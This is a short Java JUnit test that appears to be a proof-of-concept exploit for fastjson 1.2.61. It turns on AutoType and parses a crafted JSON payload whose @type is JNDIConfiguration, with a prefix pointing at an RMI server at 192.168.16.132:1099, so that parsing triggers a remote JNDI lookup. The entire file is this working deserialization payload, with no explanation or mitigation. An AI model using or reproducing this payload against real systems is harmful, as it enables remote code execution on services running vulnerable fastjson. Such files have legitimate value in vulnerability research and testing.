import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import com.alibaba.fastjson.parser.ParserConfig;
import org.junit.Test;

public class fastjson_1_2_61 {
    @Test
    public void demo() throws Exception{
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String v1_2_61 = "{\"@type\":\"org.apache.commons.configuration2.JNDIConfiguration\",\"prefix\":\"rmi://192.168.16.132:1099/olp60u\"}";
        JSONObject jsonObject = JSON.parseObject(v1_2_61);
    }
}
